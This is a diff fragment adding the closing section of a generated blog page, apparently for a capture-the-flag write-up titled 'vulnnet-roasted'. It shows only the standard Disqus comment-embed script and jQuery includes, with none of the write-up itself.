+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/vulnnet-roasted/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '0000-0000-0000-0001';
+    };
+    
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//hackndo.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </main>
+    <script src="/assets/js/jquery-2.1.4.js"></script>
+    <script src="/assets/js/jquery.menu-aim.js"></script>
+    <script src="/assets/js/anchor.min.js"></script>
+    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
+  </body>
+</html>
